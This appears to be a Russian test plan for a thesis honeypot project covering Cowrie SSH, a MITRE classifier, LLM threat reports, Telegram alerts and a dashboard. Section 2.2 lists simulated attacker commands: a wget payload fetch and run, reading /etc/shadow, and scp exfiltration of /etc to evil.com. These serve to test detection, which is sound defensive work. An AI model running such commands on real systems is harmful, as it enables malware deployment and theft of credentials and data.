# 🧪 Полный план тестирования Adaptive Honeypot System

> **VPS**: 167.71.54.188  
> **Dashboard**: http://167.71.54.188  
> **API**: http://167.71.54.188/docs  
> **SSH Honeypot**: ssh -p 2222 root@167.71.54.188  

---

## 1. Health Check — базовое

```bash
curl http://167.71.54.188/api/health
# Ожидание: {"status":"ok"}

curl http://167.71.54.188/api/stats
# Ожидание: {"total_attacks":...,"top_ips":[...],...}
```

---

## 2. SSH Honeypot — эмуляция атаки

### 2.1 Простая разведка
```bash
ssh -p 2222 -o StrictHostKeyChecking=no root@167.71.54.188
# Пароль: любой (например admin)
```
Внутри выполни:
```bash
whoami
uname -a
hostname
id
pwd
ls -la
exit
```

### 2.2 Агрессивная атака
```bash
ssh -p 2222 -o StrictHostKeyChecking=no root@167.71.54.188
```
Внутри:
```bash
wget http://malware.example/payload -O /tmp/payload
chmod +x /tmp/payload
./tmp/payload
cat /etc/passwd
cat /etc/shadow
crontab -e
tar czf /tmp/exfil.tar.gz /etc
scp /tmp/exfil.tar.gz attacker@evil.com:~/data.tar.gz
exit
```

### 2.3 Brute-force (много неудачных логинов)
```bash
for i in $(seq 1 15); do
  sshpass -p "wrong$i" ssh -p 2222 -o StrictHostKeyChecking=no root@167.71.54.188 exit 2>/dev/null
done
# или просто 15 раз попробовать зайти с неправильным паролем
```

### 2.4 Проверка результата
```bash
# Сессии (через 30-60 секунд)
curl http://167.71.54.188/api/sessions | python3 -m json.tool

# Конкретная сессия (подставь session_id)
curl http://167.71.54.188/api/sessions/2ebc0dc8bdf5 | python3 -m json.tool

# Статистика
curl http://167.71.54.188/api/stats | python3 -m json.tool
```

---

## 3. MITRE ATT&CK классификация — проверка Behavior Engine

```bash
# Посмотреть тактики в сессии
curl http://167.71.54.188/api/sessions | python3 -c "
import json,sys
sessions = json.load(sys.stdin)
for s in sessions:
    print(f\"IP: {s['attacker_ip']} | Tactic: {s['current_tactic']} | Severity: {s['severity']} | Risk: {s['risk_score']}\")
    for t in s.get('tactic_history', []):
        print(f\"  -> {t['tactic']} ({t.get('mitre_technique_id', '-')})\")
    print()
"
```

**Ожидаемые MITRE тактики от тестов:**

| Действие | Тактика | Техника |
|----------|---------|---------|
| `uname`, `whoami`, `hostname`, `id`, `netstat`, `nmap` | RECONNAISSANCE | T1590 |
| >15 неудачных логинов | BRUTE_FORCE | T1110.001 |
| `wget`, `curl`, `chmod +x`, `./payload` | MALWARE_DEPLOYMENT | T1105 |
| `cat /etc/passwd`, `cat /etc/shadow`, `whoami`, `id` | CREDENTIAL_ACCESS | T1003 |
| `crontab`, `systemctl enable`, `~/.bashrc` | PERSISTENCE | T1546 |
| `tar`, `zip`, `scp`, `rsync` | EXFILTRATION | T1560 |

---

## 4. LLM Threat Report — DeepSeek анализ

### 4.1 Сгенерировать репорт вручную
```bash
# Взять session_id из /api/sessions
SESSION_ID=$(curl -s http://167.71.54.188/api/sessions | python3 -c "import json,sys; print(json.load(sys.stdin)[0]['session_id'])")

# Сгенерировать Threat Report через DeepSeek
curl -X POST "http://167.71.54.188/api/threats/$SESSION_ID/analyze" | python3 -m json.tool

# Посмотреть все репорты
curl http://167.71.54.188/api/threats | python3 -m json.tool
```

**Ожидание:** JSON с полями:
- `severity` (CRITICAL/HIGH/MEDIUM/LOW)
- `attack_type`
- `attacker_profile`
- `attacker_goal`
- `kill_chain_phase`
- `mitre_techniques` (список техник)
- `recommendation`
- `confidence` (%)

---

## 5. Telegram уведомления — проверка

```bash
# Диагностика Telegram бота
curl http://167.71.54.188/api/telegram/diagnose | python3 -m json.tool
# Ожидание: {"bot_configured": true, "chat_configured": true, ...}

# Отправить репорт в Telegram вручную
REPORT_ID=$(curl -s http://167.71.54.188/api/threats | python3 -c "import json,sys; print(json.load(sys.stdin)[0]['id'])")
curl -X POST "http://167.71.54.188/api/threats/$REPORT_ID/notify" | python3 -m json.tool
# Ожидание: {"sent": true, ...}
```

**Проверь Telegram:** должен прийти формат:
```
🟠 HIGH ATTACK DETECTED 🟠
Attack Type: ...
Confidence: XX%
🌐 Attacker Information
IP: X.X.X.X | Location: ...
🧠 MITRE ATT&CK Techniques
• TXXXX — ...
• TXXXX — ...
📋 Actions
🔗 View Full Report
```

---

## 6. PDF экспорт — проверка

```bash
# Получить список репортов
curl http://167.71.54.188/api/threats | python3 -m json.tool

# Экспорт PDF (подставь реальный id репорта)
REPORT_ID=$(curl -s http://167.71.54.188/api/threats | python3 -c "import json,sys; print(json.load(sys.stdin)[0]['id'])")

curl -L "http://167.71.54.188/api/threats/$REPORT_ID/export" -o /tmp/threat_report.pdf

# Открыть PDF
open /tmp/threat_report.pdf  # Mac
# xdg-open /tmp/threat_report.pdf  # Linux
```

**Проверь PDF содержит:**
- Заголовок "ADAPTIVEPOT" + "CONFIDENTIAL"
- Severity badge
- Attacker Profile (IP, Location, ASN, Abuse Score)
- MITRE ATT&CK таблица (Technique ID + Name)
- Kill Chain фаза + цель
- IOCs (IP, Session ID, ASN, Country)
- Attack Timeline таблица (Timestamp, Event, Command, MITRE)
- Recommendations

---

## 7. Dashboard — визуальная проверка

Открой в браузере (режим инкогнито для избежания кеша):

| Страница | URL | Что проверять |
|----------|-----|---------------|
| **Home** | http://167.71.54.188 | KPI карточки (Total Attacks, Countries, Sessions) |
| **Sessions** | http://167.71.54.188/sessions | Таблица сессий с IP, тактиками, severity |
| **Session Detail** | нажми на сессию | Детали: events, команды, MITRE, IP intel |
| **Map** | http://167.71.54.188/map | 3D глобус с точками атак (Cobe) |
| **Live Feed** | http://167.71.54.188/live-feed | Real-time WebSocket алерты |
| **Threats** | http://167.71.54.188/threats | Список Threat Reports |
| **Analytics** | http://167.71.54.188/analytics | Графики статистики |
| **Swagger** | http://167.71.54.188/docs | Интерактивная документация API |

**Проверь в консоли браузера (F12 → Console):**
- Нет CORS ошибок
- Нет `net::ERR_FAILED`
- Успешные запросы к API

---

## 8. Collector — проверка логов

```bash
ssh root@167.71.54.188
cd /opt/honeypot-app/Honeypot_System

# Логи collector (должны показывать обработку событий)
docker compose logs collector | tail -30

# Логи cowrie (подключения к SSH)
docker compose logs cowrie | tail -30

# Логи backend (ошибки если есть)
docker compose logs backend | tail -20
```

---

## 9. База данных — прямая проверка

```bash
ssh root@167.71.54.188
cd /opt/honeypot-app/Honeypot_System

# Зайти в PostgreSQL
docker compose exec postgres psql -U honeypot -d honeypot

# Проверить таблицы
\dt

# Количество сессий
SELECT COUNT(*) FROM sessions;

# Последние 5 сессий
SELECT session_id, attacker_ip, severity, current_tactic, risk_score
FROM sessions ORDER BY start_time DESC LIMIT 5;

# Количество событий
SELECT COUNT(*) FROM events;

# Threat reports
SELECT session_id, severity, confidence FROM threat_reports ORDER BY created_at DESC LIMIT 5;

# IP Intelligence
SELECT ip, country_name, city, asn, org_name FROM ip_intel LIMIT 5;

# Выйти
\q
```

---

## 10. WebSocket / Live Feed — проверка

Открой **http://167.71.54.188/live-feed** в браузере (инкогнито).

В другом терминале подключись к Cowrie:
```bash
ssh -p 2222 -o StrictHostKeyChecking=no root@167.71.54.188
# Выполни несколько команд:
whoami && uname -a && ls && pwd && exit
```

**Ожидание на странице Live Feed:** появление карточек алертов в реальном времени (через 5-10 секунд).

Также проверь WebSocket напрямую:
```bash
# Установи websocat если нет: brew install websocat
websocat ws://167.71.54.188/ws/alerts
# Или: npm install -g wscat && wscat -c ws://167.71.54.188/ws/alerts
```

---

## 11. GeoIP — проверка обогащения

```bash
# GeoIP для конкретного IP
curl http://167.71.54.188/api/geoip/8.8.8.8 | python3 -m json.tool
# Ожидание: country, city, latitude, longitude, asn, org

# Batch GeoIP
curl http://167.71.54.188/api/geoip/batch | python3 -m json.tool
# Ожидание: список IP с гео-данными
```

---

## 12. Nginx — проверка reverse proxy

```bash
# Проверить что все пути работают через nginx
curl -s -o /dev/null -w "/            → %{http_code}\n" http://167.71.54.188/
curl -s -o /dev/null -w "/api/health  → %{http_code}\n" http://167.71.54.188/api/health
curl -s -o /dev/null -w "/api/stats   → %{http_code}\n" http://167.71.54.188/api/stats
curl -s -o /dev/null -w "/api/sessions→ %{http_code}\n" http://167.71.54.188/api/sessions
curl -s -o /dev/null -w "/docs        → %{http_code}\n" http://167.71.54.188/docs
curl -s -o /dev/null -w "/sessions    → %{http_code}\n" http://167.71.54.188/sessions
curl -s -o /dev/null -w "/map         → %{http_code}\n" http://167.71.54.188/map
curl -s -o /dev/null -w "/live-feed   → %{http_code}\n" http://167.71.54.188/live-feed
curl -s -o /dev/null -w "/threats     → %{http_code}\n" http://167.71.54.188/threats
curl -s -o /dev/null -w "/analytics   → %{http_code}\n" http://167.71.54.188/analytics
```

**Ожидание:** все `200` кроме `/live-feed` (200 тоже)

---

## 13. Docker — проверка контейнеров

```bash
ssh root@167.71.54.188
cd /opt/honeypot-app/Honeypot_System

# Статус всех контейнеров
docker compose ps

# Использование ресурсов
docker stats --no-stream

# Проверить нет ли перезапусков
docker compose ps -a | grep -v "Up"
```

---

## 14. Сканирование портов — внешняя проверка

```bash
# С локальной машины
nc -zv 167.71.54.188 80    # nginx (открыт)
nc -zv 167.71.54.188 2222  # cowrie (открыт)
nc -zv 167.71.54.188 8000  # backend (ЗАКРЫТ — 127.0.0.1)
nc -zv 167.71.54.188 5432  # postgres (ЗАКРЫТ — 127.0.0.1)
nc -zv 167.71.54.188 6379  # redis (ЗАКРЫТ — 127.0.0.1)

# Или через nmap
nmap -p 80,2222,443,8000,5432,6379,3001 167.71.54.188
```

**Ожидание:** открыты только 80 и 2222 (и 443), остальные закрыты.

---

## Чек-лист для дипломной работы

- [ ] Health check API
- [ ] SSH подключение к honeypot
- [ ] Команды записаны в лог
- [ ] Collector прочитал и сохранил в БД
- [ ] Behavior Engine классифицировал по MITRE ATT&CK
- [ ] IP enrichment выполнен (GeoIP + AbuseIPDB)
- [ ] LLM (DeepSeek) сгенерировал Threat Report
- [ ] Telegram уведомление отправлено
- [ ] PDF репорт сгенерирован и скачивается
- [ ] Dashboard показывает сессии
- [ ] Live Feed показывает real-time алерты
- [ ] Карта показывает точки атак
- [ ] Swagger документация доступна
- [ ] Nginx проксирует все пути
- [ ] Порты 8000, 5432, 6379 закрыты извне (безопасность)
- [ ] Все 7 контейнеров в статусе Up